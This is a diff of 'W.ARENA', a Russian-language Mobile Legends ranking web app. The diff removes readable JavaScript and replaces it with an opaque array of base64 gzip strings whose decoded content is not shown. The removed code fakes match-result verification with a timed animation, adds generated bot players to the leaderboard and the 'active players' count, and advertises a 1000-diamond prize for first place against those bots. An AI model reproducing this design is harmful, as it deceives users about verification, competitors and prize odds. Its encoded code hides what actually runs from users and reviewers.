@@ -1,92 +1,177 @@
-const LV=[0,801,951,1101,1251,1401,1551,1701,1851,2001],COL=['#aaa','#7ccf7c','#7ccf7c','#f1c40f','#f1c40f','#f1c40f','#ff8a00','#ff8a00','#ff5500','#e0262a'];
-const ROLES=['Золотая линия','Линия опыта','Мид','Лесник','Роумер'];
-const lvl=e=>{let l=1;LV.forEach((v,i)=>{if(e>=v)l=i+1});return l};
-const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-const badge=e=>`<span class="lvl" style="--c:${COL[lvl(e)-1]}">${lvl(e)}</span>`;
-let DB;
-function load(){try{DB=JSON.parse(localStorage.getItem('mlbb_db'))}catch(e){}
- if(!DB||!DB.users){DB={users:{},session:null,bots:[]};
-  const a=['Shadow','Alucard','Layla','Gosu','Nana','Zilong','Kagura','Fanny','Miya','Tigreal','Lancelot','Hayabusa','Lunox','Karina','Chou','Gusion'],b=['Pro','TV','xX','KZ','RU','God','King','Wolf','MVP','1337'];
-  for(let i=0;i<40;i++)DB.bots.push({nick:a[Math.floor(Math.random()*a.length)]+'_'+b[Math.floor(Math.random()*b.length)]+Math.floor(Math.random()*99),elo:800+Math.floor(Math.random()*1400),bot:1});save()}}
-function saveNow(){try{localStorage.setItem('mlbb_db',JSON.stringify(DB))}catch(e){}}
-let _sv=0;function save(){clearTimeout(_sv);_sv=setTimeout(saveNow,250)}
-addEventListener('pagehide',saveNow);addEventListener('visibilitychange',()=>{if(document.hidden)saveNow()});
-const me=()=>DB.users[DB.session];
-const IC={
-play:'<svg viewBox="0 0 24 24"><path d="M6 11h4M8 9v4M15 12h.01M18 10h.01"/><path d="M17.3 5H6.7A4.7 4.7 0 0 0 2 9.7V15a3 3 0 0 0 5.2 2l1.6-1.8h6.4l1.6 1.8A3 3 0 0 0 22 15V9.7A4.7 4.7 0 0 0 17.3 5z"/></svg>',
-profile:'<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3.2"/><path d="M5.8 18.5c1.6-2.3 3.6-3.3 6.2-3.3s4.6 1 6.2 3.3"/></svg>',
-top:'<svg viewBox="0 0 24 24"><path d="M8 21h8M12 17v4M7 4h10v5a5 5 0 0 1-10 0V4z"/><path d="M17 5h3v2a3 3 0 0 1-3 3M7 5H4v2a3 3 0 0 0 3 3"/></svg>',
-hist:'<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6.5V12l3.5 2"/></svg>'};
-
-Object.assign(IC,{fr:'<svg viewBox="0 0 24 24"><circle cx="9" cy="8" r="3.5"/><path d="M2.5 20c.5-3.6 3-5.5 6.5-5.5s6 1.9 6.5 5.5"/><circle cx="17" cy="9" r="2.6"/><path d="M17 14.2c2.6 0 4.2 1.5 4.6 4.3"/></svg>',ms:'<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="5"/><circle cx="12" cy="12" r="1.2"/></svg>',shop:'<svg viewBox="0 0 24 24"><path d="M5 8h14l-1 12H6L5 8z"/><path d="M9 8V6a3 3 0 0 1 6 0v2"/></svg>'});
-const tg=u=>bdg(u)+(u.tag?`<img class="tgi" src="${TAGS}" alt="2UC">`:'');
-const MS=[{id:'play',t:'Сыграть 3 матча',n:3,r:50},{id:'win',t:'Выиграть 2 матча',n:2,r:80},{id:'kill',t:'Набрать 15 убийств',n:15,r:60}];
-const SH=[{id:'c1',t:'Алый ник',c:'#ff3b4a',p:150},{id:'c2',t:'Золотой ник',c:'#ffd24a',p:300},{id:'c3',t:'Сакура-ник',c:'#ff9ec0',p:400},{id:'c4',t:'Неоновый ник',c:'#3cf0ff',p:500},{id:'tag',t:'Клан-тег 2UC',k:'tag',p:200}];
-function norm(u){u.coins=u.coins||0;u.fr=u.fr||[];u.inv=u.inv||[];const d=new Date().toDateString();if(!u.ms||u.ms.d!=d)u.ms={d,p:{},c:[]}}
-function toast(t){const e=document.createElement('div');e.className='toast';e.textContent=t;document.body.appendChild(e);setTimeout(()=>e.remove(),2400)}
-function finish(){const win=$('rs').value=='w',k=Math.max(0,+$('k').value||0),d=Math.max(0,+$('d').value||0),a=Math.max(0,+$('a').value||0);
- if($('mn').value.trim()!=m.no)return $('fe').textContent='Укажите верный № матча: '+m.no;
- if(!$('sf').files.length)return $('fe').textContent='Прикрепите финальный скриншот';
- const st=['Заявка отправлена','Result Pending — в очереди обработки','Платформа сверяет участника матча','Результат подтверждён'];let i=0;
- $('v').innerHTML=`<div class="card"><h2>Матч №${m.no}</h2><div id="pl"></div></div>`;
- const t=setInterval(()=>{$('pl').innerHTML=st.slice(0,i+1).map((x,j)=>{const ok=j<i||i==3;return `<div class="p"><span class="lvl" style="--c:${ok?'#2ecc71':'#e11d2e'}">${ok?'✓':'…'}</span><span>${x}</span></div>`}).join('');if(i++==3){clearInterval(t);setTimeout(()=>commit(win,k,d,a),700)}},900)}
-function msV(){const u=me();$('v').innerHTML=`<div class="card row sp"><div><h2>Ежедневные миссии</h2><div class="mu">Обновляются каждый день</div></div><b>🪙 ${u.coins}</b></div>`+MS.map(q=>{const p=Math.min(q.n,u.ms.p[q.id]||0),dn=p>=q.n,cl=u.ms.c.includes(q.id);return `<div class="card"><div class="row sp"><b>${q.t}</b><span class="mu">+${q.r} 🪙</span></div><div class="bar" style="margin:8px 0"><i style="width:${p/q.n*100}%"></i></div><div class="row sp"><span class="mu">${p}/${q.n}</span><button ${dn&&!cl?'':'disabled'} onclick="claim('${q.id}')">${cl?'Получено':'Забрать'}</button></div></div>`}).join('')}
-function claim(id){const u=me(),q=MS.find(x=>x.id==id);if((u.ms.p[id]||0)<q.n||u.ms.c.includes(id))return;u.ms.c.push(id);u.coins+=q.r;save();app();toast('+'+q.r+' 🪙')}
-function shopV(){const u=me();$('v').innerHTML=`<div class="card row sp"><div><h2>Магазин</h2><div class="mu">Токены за матчи и миссии</div></div><b>🪙 ${u.coins}</b></div><div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(150px,1fr))">`+SH.map(i=>{const has=u.inv.includes(i.id),on=i.k=='tag'?u.tag:u.eq==i.c;
- const pv=i.k=='tag'?`<img class="tgi" style="height:30px" src="${TAGS}" alt="2UC">`:`<b style="color:${i.c};font-size:18px">${esc(u.nick)}</b>`;
- const lb=i.k?(on?'Снять':has?'Надеть':i.p+' 🪙'):(on?'Надето':has?'Надеть':i.p+' 🪙');
- return `<div class="card" style="text-align:center"><div style="height:50px;display:grid;place-items:center">${pv}</div><div class="mu">${i.t}</div><br><button ${!i.k&&on?'disabled':''} onclick="buy('${i.id}')">${lb}</button></div>`}).join('')+'</div>'}
-function buy(id){const u=me(),i=SH.find(x=>x.id==id);if(!u.inv.includes(id)){if(u.coins<i.p)return toast('Не хватает монет');u.coins-=i.p;u.inv.push(id);toast('Куплено: '+i.t)}else if(i.k&&u[i.k]){u[i.k]=0;save();return app()}
- if(i.k=='tag')u.tag=1;else u.eq=i.c;save();app()}
-function findP(n){n=n.trim().toLowerCase();const u=DB.users[n];if(u)return{nick:u.nick,elo:u.elo};const b=DB.bots.find(b=>b.nick.toLowerCase()==n);return b&&{nick:b.nick,elo:b.elo}}
-function frV(){const u=me();$('v').innerHTML=`<div class="card"><h2>Друзья</h2><div class="row" style="margin-top:8px"><input id="fn" placeholder="Никнейм игрока" style="margin:0"><button onclick="addF()">Добавить</button></div><div class="err" id="fe2"></div></div><div class="card">${u.fr.length?u.fr.map(n=>{const f=findP(n)||{nick:n,elo:1000},on=hash(f.nick)%3!=0;return `<div class="p">${badge(f.elo)}<div style="flex:1;min-width:0"><div class="n">${esc(f.nick)}${vf(f.nick)}</div><div class="mu"><span style="color:${on?'var(--ok)':'var(--mu)'}">●</span> ${on?'в сети':'не в сети'} · ELO ${f.elo}</div></div><button class="g" ${on?'':'disabled'} data-n="${esc(f.nick)}" onclick="toast('Приглашение отправлено: '+this.dataset.n)">Позвать</button><button class="g" data-n="${esc(f.nick)}" onclick="delF(this.dataset.n)">✕</button></div>`}).join(''):'<p class="mu">Список друзей пуст. Добавьте игрока по нику, например из таблицы лидеров.</p>'}</div>`}
-function addF(){const f=findP($('fn').value),u=me(),e=t=>$('fe2').textContent=t;if(!f)return e('Игрок не найден');if(f.nick==u.nick)return e('Это вы');if(u.fr.includes(f.nick))return e('Уже в друзьях');u.fr.push(f.nick);save();frV()}
-function delF(n){const u=me();u.fr=u.fr.filter(x=>x!=n);save();frV()}
-function landing(){const us=Object.values(DB.users),mt=us.reduce((a,u)=>a+u.w+u.l,0),top=DB.bots.concat(us).sort((a,b)=>b.elo-a.elo).slice(0,5);
- $('app').innerHTML=`<header>${brand()}<div class="row"><button class="g" onclick="togLang()">${LANG=='en'?'RU':'EN'}</button><button class="g" onclick="showUI()">🎨</button><button class="g" onclick="authView('in')">Войти</button></div></header>
- <div class="card hero"><div style="color:var(--ac);font-weight:700;font-size:13px">Киберспортивная платформа Mobile Legends</div><h1 class="hh">Проверь свой скилл, поднимай уровень и играй против тех, кто пришёл побеждать.</h1><p class="mu">Собирай победные серии, расти в рейтинге, открывай уровни и выполняй миссии.</p><div class="row"><button onclick="authView('reg')">Начать играть</button><button class="g" onclick="authView('in')">Войти</button>${inst0()}</div></div>
- ${promo(1)}<div class="grid"><div class="st"><b>${DB.bots.length+us.length}</b>Активные игроки</div><div class="st"><b>${mt}</b>Сыграно матчей</div><div class="st"><b>#1</b>${esc(top[0].nick)}</div></div>
- <h2 style="margin:20px 0 8px">Топ рейтинга</h2><div class="card">${top.map((p,i)=>`<div class="p"><b>#${i+1}</b>${badge(p.elo)}<span class="n" style="flex:1">${esc(p.nick)}${vf(p.nick)}</span><span class="mu">ELO ${p.elo}</span></div>`).join('')}</div>
- <h2 style="margin:20px 0 8px">Как проходит отправка результата</h2>
- ${[['1','Игрок отправляет заявку','Указывает № матча и прикрепляет финальный скриншот.'],['2','Result Pending','Заявка попадает в очередь обработки.'],['3','Платформа сверяет участника','Чужие заявки не принимаются, результат подтверждается.']].map(x=>`<div class="card row"><span class="lvl" style="--c:var(--ac)">${x[0]}</span><div><b>${x[1]}</b><div class="mu">${x[2]}</div></div></div>`).join('')}
- <p class="mu" style="text-align:center">W.ARENA · цифровая соревновательная платформа MLBB · <a href="#" onclick="showRules();return false" style="color:var(--ac)">Правила</a>${linksHTML()}</p>`}
-
-const GOOGLE_CLIENT_ID=''; // ← вставьте сюда Client ID из Google Cloud Console
-const brand=()=>`<div class="brand" style="cursor:pointer" onclick="goHome()"><img class="lg" src="${LOGO}" alt=""><span class="bn">W.<b>ARENA</b></span></div>`;
-const av=(u,n=30)=>u.avatar?`<img class="av ${u.fm?'fm-'+u.fm:''}" style="width:${n}px;height:${n}px" src="${u.avatar}" alt="">`:`<span class="av ${u.fm?'fm-'+u.fm:''}" style="width:${n}px;height:${n}px;font-size:${Math.round(n*.45)}px">${esc((u.nick||'?')[0].toUpperCase())}</span>`;
-function setAv(inp){const f=inp.files[0];if(!f)return;const r=new FileReader();r.onload=()=>{const im=new Image();im.onload=()=>{const c=document.createElement('canvas');c.width=c.height=160;const z=Math.min(im.width,im.height);c.getContext('2d').drawImage(im,(im.width-z)/2,(im.height-z)/2,z,z,0,0,160,160);me().avatar=c.toDataURL('image/jpeg',.82);save();app();toast('Аватарка обновлена')};im.onerror=()=>toast('Не удалось открыть фото');im.src=r.result};r.readAsDataURL(f)}
-Object.assign(IC,{sup:'<svg viewBox="0 0 24 24"><path d="M4 14v-2a8 8 0 0 1 16 0v2"/><rect x="2.5" y="14" width="4" height="6" rx="1.5"/><rect x="17.5" y="14" width="4" height="6" rx="1.5"/><path d="M19.5 20c0 1.2-1.5 2-4 2h-2"/></svg>'});
-const FAQ=[['Как начисляется ELO?','После матча укажите № матча и приложите скриншот. Результат подтверждается, ELO пересчитывается.'],['Как получить токены?','За каждый матч и за выполнение ежедневных миссий.'],['Как сменить аватарку?','Профиль → нажмите на аватарку и выберите фото.'],['Забыл пароль','Напишите обращение в поддержку и укажите свой ник.']];
-let so=-1;
-function supV(){const u=me();u.tk=u.tk||[];$('v').innerHTML=`<div class="card"><h2>Тех. поддержка</h2><div class="mu">Опишите проблему, ответ придёт сюда</div><input id="ts" placeholder="Тема" maxlength="60" style="margin-top:10px"><textarea id="tm" rows="3" maxlength="500" placeholder="Сообщение"></textarea><div class="err" id="te"></div><button class="big" onclick="newT()">Отправить обращение</button></div>`+
-(u.tk.length?`<h3 style="margin:16px 2px 8px">Ваши обращения</h3>`+u.tk.map((t,i)=>`<details class="card" ${so==i?'open':''}><summary><b>№${t.id}</b> · ${esc(t.s)} <span class="mu">· ${t.st}</span></summary><div style="margin-top:10px">${t.m.map(m=>`<div class="msg ${m.f}"><div class="mu">${m.f=='u'?'Вы':'Поддержка · автоответ'}</div>${esc(m.t)}</div>`).join('')}<div class="row" style="margin-top:8px"><input id="r${i}" placeholder="Ответить…" style="margin:0"><button onclick="repT(${i})">➤</button></div></div></details>`).join(''):'')+
-`<h3 style="margin:16px 2px 8px">Частые вопросы</h3>`+FAQ.map(q=>`<details class="card"><summary><b>${q[0]}</b></summary><p class="mu">${q[1]}</p></details>`).join('')}
-function newT(){const u=me(),s=$('ts').value.trim(),t=$('tm').value.trim();if(s.length<3||t.length<5)return $('te').textContent='Заполните тему и сообщение';const id=1000+Math.floor(Math.random()*9000);u.tk.unshift({id,s,st:'Открыт',m:[{f:'u',t}]});so=0;save();supV();autoR(u,id,'Здравствуйте! Мы получили обращение №'+id+' и уже разбираем его. Обычно отвечаем в течение 24 часов.')}
-function repT(i){const u=me(),t=u.tk[i],v=$('r'+i).value.trim();if(!v)return;t.m.push({f:'u',t:v});so=i;save();supV();autoR(u,t.id,'Спасибо, добавили ваше сообщение в обращение №'+t.id+'.')}
-function autoR(u,id,txt){setTimeout(()=>{const t=u.tk.find(x=>x.id==id);if(!t)return;t.m.push({f:'s',t:txt});t.st='Отвечено';save();if(tab=='sup'&&me()===u){so=u.tk.indexOf(t);supV()}toast('Новый ответ поддержки')},1800)}
-const G_ICON='<svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9 3.5l6.7-6.7C35.6 2.4 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.8 6.1C12.3 13.6 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17.5z"/><path fill="#FBBC05" d="M10.4 28.7A14.5 14.5 0 0 1 9.5 24c0-1.6.3-3.2.8-4.7l-7.8-6.1A24 24 0 0 0 0 24c0 3.9.9 7.5 2.6 10.8l7.8-6.1z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2.1 1.4-4.7 2.3-7.7 2.3-6.3 0-11.7-4.1-13.6-9.8l-7.8 6.1C6.5 42.6 14.6 48 24 48z"/></svg>';
-function gInit(){const el=$('gb');if(!el)return;
- if(!GOOGLE_CLIENT_ID){el.innerHTML=`<button class="g gb" onclick="gHelp()">${G_ICON} Продолжить с Google</button>`;return}
- const go=()=>{google.accounts.id.initialize({client_id:GOOGLE_CLIENT_ID,callback:gCb});google.accounts.id.renderButton(el,{theme:'filled_black',size:'large',shape:'pill',text:'continue_with',width:Math.min(340,el.clientWidth||300)})};
- if(window.google&&google.accounts)return go();
- const sc=document.createElement('script');sc.src='https://accounts.google.com/gsi/client';sc.async=true;sc.onload=go;sc.onerror=()=>{el.innerHTML='<div class="err">Google недоступен. Проверьте интернет или VPN.</div>'};document.head.appendChild(sc)}
-function gHelp(){const e=document.createElement('div');e.className='md';e.onclick=ev=>{if(ev.target==e)e.remove()};e.innerHTML=`<div class="card"><h2>Вход через Google</h2><p class="mu">Кнопка заработает после настройки на хостинге:<br>1. console.cloud.google.com → APIs &amp; Services → Credentials.<br>2. Create credentials → OAuth client ID → Web application.<br>3. В Authorized JavaScript origins добавьте адрес сайта (https://ваш-ник.github.io).<br>4. Скопируйте Client ID и вставьте в index.html в строку GOOGLE_CLIENT_ID.</p><button class="big" onclick="this.closest('.md').remove()">Понятно</button></div>`;document.body.appendChild(e)}
-let gNew=null;
-function gCb(r){try{const j=JSON.parse(decodeURIComponent(escape(atob(r.credential.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')))));const ex=Object.values(DB.users).find(x=>x.gsub==j.sub);
- if(ex){DB.session=ex.nick.toLowerCase();save();tab='play';return app()}gNew={sub:j.sub,name:j.name||'',email:j.email||''};gComplete()}catch(e){toast('Ошибка входа через Google')}}
-function gComplete(){$('app').innerHTML=`<header>${brand()}</header><div class="card" style="margin-top:30px"><h2>Завершите регистрацию</h2><p class="mu">Вы вошли через Google (${esc(gNew.email)}). Укажите игровые данные.</p><label class="mu">Никнейм</label><input id="nk" maxlength="16" value="${esc(gNew.name.replace(/[^\wА-Яа-я-]/g,'').slice(0,16))}"><label class="mu">Игровой ID (MLBB)</label><input id="gid" inputmode="numeric" maxlength="12"><label class="mu">Основная роль</label><select id="rl">${ROLES.map(r=>`<option>${r}</option>`).join('')}</select><div class="err" id="er"></div><button class="big" onclick="gFin()">Продолжить</button></div>`}
-function gFin(){const n=$('nk').value.trim(),g=$('gid').value.trim(),er=t=>$('er').textContent=t;if(!/^[\wА-Яа-я-]{3,16}$/.test(n))return er('Ник: 3–16 символов, буквы/цифры/_/-');if(!/^\d{6,12}$/.test(g))return er('Игровой ID: 6–12 цифр');if(DB.users[n.toLowerCase()])return er('Ник уже занят');
- DB.users[n.toLowerCase()]={nick:n,gid:g,pw:'',gsub:gNew.sub,email:gNew.email,role:$('rl').value,elo:1000,w:0,l:0,k:0,d:0,a:0,hist:[],ts:Date.now()};DB.session=n.toLowerCase();save();tab='play';gNew=null;app()}
-
-Object.assign(IC,{news:'<svg viewBox="0 0 24 24"><path d="M4 5h13v14a2 2 0 0 0 2 2H6a2 2 0 0 1-2-2V5z"/><path d="M17 9h3v10a2 2 0 0 1-2 2"/><path d="M7.5 9h6M7.5 13h6M7.5 17h4"/></svg>'});
-const DIA='<svg viewBox="0 0 100 90"><defs><linearGradient id="dg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#8ef0ff"/><stop offset=".5" stop-color="#2a8cff"/><stop offset="1" stop-color="#5b2bff"/></linearGradient></defs><polygon points="25,5 75,5 98,32 50,88 2,32" fill="url(#dg)"/><polygon points="25,5 50,32 2,32" fill="#fff" opacity=".35"/><polygon points="75,5 98,32 50,32" fill="#fff" opacity=".15"/><polygon points="2,32 50,32 50,88" fill="#000" opacity=".15"/><polygon points="98,32 50,32 50,88" fill="#000" opacity=".3"/><polygon points="25,5 75,5 50,32" fill="#fff" opacity=".5"/></svg>';
-function promo(g){const o=g?"authView('reg')":"tab='news';app()";return `<div class="promo" onclick="${o}"><span class="pdm">${DIA}</span><div style="flex:1;min-width:0"><b>Розыгрыш 1000 алмазов</b><div class="mu">Займи 1 место и получи приз</div></div><span class="ch">›</span></div>`}
-function newsV(){const u=me(),all=DB.bots.concat(Object.values(DB.users).map(x=>({nick:x.nick,elo:x.elo,real:1}))).sort((a,b)=>b.elo-a.elo),pos=all.findIndex(p=>p.real&&p.nick==u.nick)+1,top=all[0],lead=top.real&&top.nick==u.nick,gap=top.elo-u.elo+1;
-$('v').innerHTML=`<div class="poster"><span class="tw t1">✦</span><span class="tw t2">✦</span><span class="tw t3">✦</span><div class="dm d1">${DIA}</div><div class="dm d2">${DIA}</div><div class="dm d3">${DIA}</div>
-<div class="pt"><span class="pill">РОЗЫГРЫШ</span><div class="b1">1000</div><div class="sb">АЛМАЗОВ</div><div class="mu2">на твой игровой аккаунт</div><div class="cta">Займи 1 место — получи приз</div></div></div>
-<div class="card"><h2>Условия</h2><ol class="cond"><li>Зарегистрируйтесь и укажите верный игровой ID Mobile Legends.</li><li>Играйте рейтинговые матчи и отправляйте результаты со скриншотом.</li><li>Займите <b>1 место</b> в таблице лидеров W.ARENA.</li><li>Победитель получает <b>1000 алмазов</b> на свой игровой аккаунт.</li></ol><div class="mu">Итоги подводит администрация проекта.</div></div>
-<div class="card"><h3>Твой прогресс</h3><div class="row sp" style="margin:8px 0"><span>Твоё место: <b>#${pos}</b></span><span class="mu">Лидер: ${esc(top.nick)} · ${top.elo}</span></div><div class="bar"><i style="width:${Math.min(100,u.elo/top.elo*100)}%"></i></div><p class="mu" style="margin:8px 0 0">${lead?'Ты на 1 месте! Удерживай позицию до конца розыгрыша.':'До 1 места: '+gap+' ELO. Приз придёт на ID '+esc(u.gid||'—')+'.'}</p><br><button class="big" onclick="tab='play';app()">Играть и подниматься</button></div>
-<h3 style="margin:16px 2px 8px">Новости проекта</h3>
-<div class="card"><span class="mu">Запуск</span><h3>W.ARENA открыт</h3><p class="mu" style="margin:6px 0 0">Рейтинг ELO, уровни 1–10, подбор матчей 5×5 и история игр уже доступны.</p></div>
-<div class="card"><span class="mu">Обновление</span><h3>Миссии, магазин и колесо удачи</h3><p class="mu" style="margin:6px 0 0">Выполняйте ежедневные задания, копите токены и покупайте цвета ника, рамки и титулы, а раз в день крутите колесо удачи.</p></div>`}
-const DICT_RAW="Войти|Log in\nВход|Log in\nРегистрация|Sign up\nСоздать аккаунт|Create account\nНет аккаунта?|No account?\nУже есть аккаунт?|Already have an account?\n← На главную|← Home\nНикнейм игрока|Player nickname\nНикнейм|Nickname\nИгровой ID (MLBB)|Game ID (MLBB)\nОсновная роль|Main role\nПовторите пароль|Repeat password\nПароль минимум 6 символов|Password must be at least 6 
+(function(){var B=[
+"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",
